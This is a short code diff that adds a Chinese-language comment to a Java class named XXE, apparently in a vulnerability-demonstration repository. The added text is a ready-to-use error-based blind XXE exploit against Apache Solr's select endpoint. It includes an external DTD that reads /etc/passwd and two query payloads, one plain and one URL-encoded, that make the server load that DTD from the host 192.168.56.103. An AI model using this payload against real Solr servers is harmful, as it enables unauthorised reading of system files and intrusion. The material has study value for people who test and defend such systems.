@@ -164,4 +164,18 @@ public class XXE {
      *
      */
 
+
+    /**
+     * 通用Blind XXE盲打，利用Error Based XXE读取数据。
+     *
+     * 文件：1.dtd
+         <!ENTITY % file SYSTEM "file:///etc/passwd">
+         <!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
+     *
+     * Payload：
+         /solr/demo/select?&q=<?xml version="1.0" ?><!DOCTYPE root[<!ENTITY % ext SYSTEM "http://192.168.56.103/1.dtd">%ext;%ent;]><r>&data;</r>&wt=xml&defType=xmlparser
+         /solr/demo/select?&q=%3c%3fxml%20version%3d%221.0%22%20%3f%3e%3c!DOCTYPE%20root%5b%3c!ENTITY%20%25%20ext%20SYSTEM%20%22http%3a%2f%2f192.168.56.103%2f1.dtd%22%3e%25ext%3b%25ent%3b%5d%3e%3cr%3e%26data%3b%3c%2fr%3e&wt=xml&defType=xmlparser
+     *
+     */
+
 }
